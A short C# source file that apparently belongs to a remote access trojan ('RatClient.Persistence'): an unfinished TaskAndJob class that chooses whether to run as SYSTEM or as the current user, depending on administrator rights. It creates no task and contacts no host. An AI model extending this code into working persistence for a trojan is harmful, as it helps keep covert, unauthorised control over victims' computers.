using System;


namespace RatClient.Persistence
{
    class TaskAndJob
    {
        string executablePath;
        string user;
        TaskAndJob(string executablePath)
        {
            if (Tools.IsAdministrator())
            {
                user = "SYSTEM";
            }
            else
            {
                user = Environment.UserName;
            }
        }
    }
}
